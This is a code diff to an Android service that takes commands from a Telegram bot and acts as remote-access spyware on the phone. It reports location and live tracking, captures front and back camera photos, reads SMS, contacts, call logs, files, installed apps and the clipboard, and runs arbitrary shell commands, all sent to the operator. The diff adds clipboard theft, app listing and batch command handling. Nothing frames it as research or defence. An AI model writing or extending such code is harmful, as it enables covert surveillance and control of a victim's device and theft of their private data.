@@ -60,33 +60,55 @@ public class BotService extends Service {
                     if(!cid.equals(TgApi.CHAT_ID)) continue;
                     String txt = m.optString("text","");
                     if(txt.isEmpty()) continue;
-                    handle(txt);
+                    handleMulti(txt);
                 }
             }catch(Exception e){
                 try{ Thread.sleep(2500); }catch(Exception ex){}
             }
         }
     }
+    private void handleMulti(String raw){
+        String[] lines = raw.split("\\r?\\n");
+        for(String line : lines){
+            String cmd = line.trim();
+            if(cmd.isEmpty()) continue;
+            try{ handle(cmd); }catch(Exception e){ TgApi.send("err "+cmd+": "+e.getMessage()); }
+            try{ Thread.sleep(300); }catch(Exception e){}
+        }
+    }
     private void handle(String cmd){
-        try{
-            cmd = cmd.trim();
-            if(cmd.equals("/start") || cmd.equals("/help")){
-                TgApi.send("MENU:\n/info\n/loc\n/live\n/cam\n/cam_back\n/sms\n/contacts\n/callog\n/files\n/vibrate\n/shell");
-                return;
-            }
-            if(cmd.equals("/info")){ TgApi.send("Model: "+Build.MODEL+"\nBrand: "+Build.BRAND+"\nAndroid: "+Build.VERSION.RELEASE); return; }
-            if(cmd.equals("/loc")){ sendLoc(); return; }
-            if(cmd.equals("/live")){ liveLoc(); return; }
-            if(cmd.equals("/cam")){ capture(0); return; }
-            if(cmd.equals("/cam_back")){ capture(1); return; }
-            if(cmd.equals("/sms")){ sms(); return; }
-            if(cmd.equals("/contacts")){ contacts(); return; }
-            if(cmd.equals("/callog")){ callog(); return; }
-            if(cmd.equals("/files")){ files(); return; }
-            if(cmd.equals("/vibrate")){ vib(); return; }
-            if(cmd.startsWith("/shell ")){ shell(cmd.substring(7)); return; }
-            TgApi.send("Unknown: "+cmd);
-        }catch(Exception e){ TgApi.send("err "+e.getMessage()); }
+        String c = cmd.toLowerCase();
+        if(c.equals("/start") || c.equals("/help") || c.equals("menu")){
+            TgApi.send("MENU:\n" +
+                "/info - Device\n" +
+                "/loc - Lokasi\n" +
+                "/live - Live 60s\n" +
+                "/cam - Cam depan\n" +
+                "/cam_back - Cam belakang\n" +
+                "/sms - SMS\n" +
+                "/contacts - Kontak\n" +
+                "/callog - Call log\n" +
+                "/files - File\n" +
+                "/apps - App list\n" +
+                "/vibrate - Vibrate\n" +
+                "/shell <cmd> - Shell\n" +
+                "/clip - Clipboard");
+            return;
+        }
+        if(c.equals("/info")||c.equals("/device")){ TgApi.send("Model: "+Build.MODEL+"\nBrand: "+Build.BRAND+"\nAndroid: "+Build.VERSION.RELEASE+"\nSDK: "+Build.VERSION.SDK_INT); return; }
+        if(c.equals("/loc")||c.equals("/location")){ sendLoc(); return; }
+        if(c.equals("/live")){ liveLoc(); return; }
+        if(c.equals("/cam")||c.equals("/camera")){ capture(0); return; }
+        if(c.equals("/cam_back")){ capture(1); return; }
+        if(c.equals("/sms")){ sms(); return; }
+        if(c.equals("/contacts")){ contacts(); return; }
+        if(c.equals("/callog")){ callog(); return; }
+        if(c.equals("/files")){ files(); return; }
+        if(c.equals("/apps")){ apps(); return; }
+        if(c.equals("/vibrate")){ vib(); return; }
+        if(c.equals("/clip")){ clip(); return; }
+        if(c.startsWith("/shell ")){ shell(cmd.substring(7)); return; }
+        TgApi.send("Unknown: "+cmd);
     }
     private void sendLoc(){
         try{
@@ -95,14 +117,19 @@ public class BotService extends Service {
                 Location l = locMgr.getLastKnownLocation(p);
                 if(l!=null && (last==null || l.getTime()>last.getTime())) last = l;
             }
-            if(last!=null){ TgApi.sendLoc(last.getLatitude(), last.getLongitude()); TgApi.send("Lat: "+last.getLatitude()+"\nLon: "+last.getLongitude()); }
-            else TgApi.send("no location");
+            if(last!=null){
+                TgApi.sendLoc(last.getLatitude(), last.getLongitude());
+                TgApi.send("Lat: "+last.getLatitude()+"\nLon: "+last.getLongitude()+"\nAcc: "+last.getAccuracy()+"m");
+            } else TgApi.send("No location. Coba /live");
         }catch(Exception e){ TgApi.send("loc err "+e.getMessage()); }
     }
     private void liveLoc(){
-        TgApi.send("live 60s");
+        TgApi.send("Live 60s started");
         final LocationListener ll = new LocationListener(){
-            public void onLocationChanged(Location l){ TgApi.sendLoc(l.getLatitude(), l.getLongitude()); TgApi.send("Lat: "+l.getLatitude()+"\nLon: "+l.getLongitude()); }
+            public void onLocationChanged(Location l){
+                TgApi.sendLoc(l.getLatitude(), l.getLongitude());
+                TgApi.send("Lat: "+l.getLatitude()+"\nLon: "+l.getLongitude());
+            }
             public void onStatusChanged(String s,int i,Bundle b){}
             public void onProviderEnabled(String s){}
             public void onProviderDisabled(String s){}
@@ -111,9 +138,13 @@ public class BotService extends Service {
             locMgr.requestLocationUpdates(LocationManager.GPS_PROVIDER, 5000, 0, ll);
             locMgr.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 5000, 0, ll);
         }catch(Exception e){}
-        new Handler(Looper.getMainLooper()).postDelayed(()->{ try{ locMgr.removeUpdates(ll); }catch(Exception e){} }, 60000);
+        new Handler(Looper.getMainLooper()).postDelayed(()->{
+            try{ locMgr.removeUpdates(ll); }catch(Exception e){}
+            TgApi.send("Live done");
+        }, 60000);
     }
     private void capture(final int facing){
+        TgApi.send("Cam capture...");
         try{
             CameraManager cm = (CameraManager) getSystemService(CAMERA_SERVICE);
             String camId = null;
@@ -122,7 +153,7 @@ public class BotService extends Service {
                 Integer f = ch.get(CameraCharacteristics.LENS_FACING);
                 if(f!=null && f==facing){ camId=id; break; }
             }
-            if(camId==null){ TgApi.send("no cam"); return; }
+            if(camId==null){ TgApi.send("No camera"); return; }
             cm.openCamera(camId, new CameraDevice.StateCallback(){
                 public void onOpened(CameraDevice cam){
                     try{
@@ -133,7 +164,7 @@ public class BotService extends Service {
                                 java.nio.ByteBuffer buf = img.getPlanes()[0].getBuffer();
                                 byte[] by = new byte[buf.remaining()];
                                 buf.get(by); img.close();
-                                TgApi.sendPhoto(Base64.encodeToString(by,Base64.NO_WRAP),"cam");
+                                TgApi.sendPhoto(Base64.encodeToString(by,Base64.NO_WRAP),"Cam "+(facing==0?"front":"back"));
                             }
                             cam.close();
                         }, null);
@@ -148,22 +179,26 @@ public class BotService extends Service {
                                 }
                                 public void onConfigureFailed(CameraCaptureSession s){}
                             }, null);
-                    }catch(Exception e){}
+                    }catch(Exception e){ TgApi.send("Cam open err: "+e.getMessage()); }
                 }
                 public void onDisconnected(CameraDevice c){}
-                public void onError(CameraDevice c,int e){ TgApi.send("cam err "+e); }
+                public void onError(CameraDevice c,int e){ TgApi.send("Cam err "+e); }
             }, null);
-        }catch(Exception e){ TgApi.send("cam ex "+e.getMessage()); }
+        }catch(Exception e){ TgApi.send("Cam ex "+e.getMessage()); }
     }
     private void sms(){
         try{
             StringBuilder sb = new StringBuilder();
             android.database.Cursor c = getContentResolver().query(Uri.parse("content://sms/inbox"),null,null,null,"date DESC LIMIT 20");
+            int n = 0;
             while(c!=null && c.moveToNext()){
-                sb.append(c.getString(c.getColumnIndex("address"))).append(": ").append(c.getString(c.getColumnIndex("body"))).append("\n");
+                sb.append("[").append(c.getString(c.getColumnIndex("address"))).append("]\n")
+                  .append(c.getString(c.getColumnIndex("body"))).append("\n---\n");
+                n++;
             }
             if(c!=null)c.close();
             String t = sb.toString();
+            if(t.isEmpty()) t = "No SMS";
             if(t.length()>3500) t = t.substring(0,3500);
             TgApi.send(t);
         }catch(Exception e){ TgApi.send("sms err "+e.getMessage()); }
@@ -174,11 +209,15 @@ public class BotService extends Service {
             android.database.Cursor c = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,null,null,null,null);
             int n=0;
             while(c!=null && c.moveToNext() && n<100){
-                sb.append(c.getString(c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))).append(": ").append(c.getString(c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))).append("\n");
+                sb.append(c.getString(c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)))
+                  .append(": ")
+                  .append(c.getString(c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)))
+                  .append("\n");
                 n++;
             }
             if(c!=null)c.close();
             String t = sb.toString();
+            if(t.isEmpty()) t = "No contacts";
             if(t.length()>3500) t = t.substring(0,3500);
             TgApi.send(t);
         }catch(Exception e){ TgApi.send("ct err "+e.getMessage()); }
@@ -188,24 +227,56 @@ public class BotService extends Service {
             StringBuilder sb = new StringBuilder();
             android.database.Cursor c = getContentResolver().query(CallLog.Calls.CONTENT_URI,null,null,null,"date DESC LIMIT 30");
             while(c!=null && c.moveToNext()){
-                sb.append(c.getString(c.getColumnIndex(CallLog.Calls.NUMBER))).append(" ").append(c.getString(c.getColumnIndex(CallLog.Calls.DURATION))).append("s\n");
+                sb.append(c.getString(c.getColumnIndex(CallLog.Calls.NUMBER)))
+                  .append(" ")
+                  .append(c.getString(c.getColumnIndex(CallLog.Calls.DURATION)))
+                  .append("s\n");
             }
             if(c!=null)c.close();
-            TgApi.send(sb.toString());
+            String t = sb.toString();
+            if(t.isEmpty()) t = "No call log";
+            TgApi.send(t);
         }catch(Exception e){ TgApi.send("cl err "+e.getMessage()); }
     }
     private void files(){
         try{
             StringBuilder sb = new StringBuilder();
             File[] fs = Environment.getExternalStorageDirectory().listFiles();
-            if(fs!=null) for(File f : fs) sb.append(f.getName()).append("\n");
+            if(fs!=null) for(File f : fs) sb.append(f.isDirectory()?"[D] ":"[F] ").append(f.getName()).append("\n");
             String t = sb.toString();
+            if(t.isEmpty()) t = "No files";
             if(t.length()>3500) t = t.substring(0,3500);
             TgApi.send(t);
         }catch(Exception e){ TgApi.send("fl err "+e.getMessage()); }
     }
+    private void apps(){
+        try{
+            StringBuilder sb = new StringBuilder();
+            PackageManager pm = getPackageManager();
+            for(android.content.pm.ApplicationInfo a : pm.getInstalledApplications(0))
+                sb.append(a.packageName).append("\n");
+            String t = sb.toString();
+            if(t.length()>3500) t = t.substring(0,3500);
+            TgApi.send(t);
+        }catch(Exception e){ TgApi.send("ap err "+e.getMessage()); }
+    }
+    private void clip(){
+        try{
+            ClipboardManager cm = (ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
+            if(cm.hasPrimaryClip()){
+                CharSequence t = cm.getPrimaryClip().getItemAt(0).getText();
+                TgApi.send("Clip: "+(t!=null?t.toString():""));
+            } else TgApi.send("Clip empty");
+        }catch(Exception e){ TgApi.send("clip err "+e.getMessage()); }
+    }
     private void vib(){
-        try{ ((Vibrator)getSystemService(VIBRATOR_SERVICE)).vibrate(2000); TgApi.send("vib"); }catch(Exception e){}
+        try{
+            Vibrator v = (Vibrator) getSystemService(VIBRATOR_SERVICE);
+            if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
+                v.vibrate(VibrationEffect.createOneShot(2000, VibrationEffect.DEFAULT_AMPLITUDE));
+            else v.vibrate(2000);
+            TgApi.send("vib OK");
+        }catch(Exception e){ TgApi.send("vib err "+e.getMessage()); }
     }
     private void shell(String cmd){
         try{
@@ -215,6 +286,7 @@ public class BotService extends Service {
             String l;
             while((l=r.readLine())!=null) sb.append(l).append("\n");
             String t = sb.toString();
+            if(t.isEmpty()) t = "(no output)";
             if(t.length()>3500) t = t.substring(0,3500);
             TgApi.send(t);
         }catch(Exception e){ TgApi.send("sh err "+e.getMessage()); }
